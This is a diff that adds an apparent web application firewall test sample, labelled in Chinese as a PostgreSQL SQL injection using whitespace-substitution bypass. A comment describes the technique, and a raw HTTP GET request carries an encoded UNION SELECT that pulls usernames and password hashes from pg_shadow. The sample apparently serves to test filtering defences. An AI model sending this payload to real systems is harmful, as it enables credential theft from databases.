@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入(空白符替换绕过)-06506370
+# 攻击者基于union查询使用空白符替换进行绕过，将"union%0cselect%0cusename,passwd%0cfrom%0cpg_shadow"语句注入到 SQL 查询参数中，从系统表pg_shadow查询所有用户名密码信息。
+GET /?id=1%250cunion%250cselect%250cusename%2Cpasswd%250cfrom%250cpg_shadow&bid=hd_tag_m8mv23wy HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23wy
+RM-PRO-Token: 992e5a70447b9a3370e3304cf4f09c3e
+RM-PRO-Time: 1742808350465
+User-Agent: curl/7.83.1
+
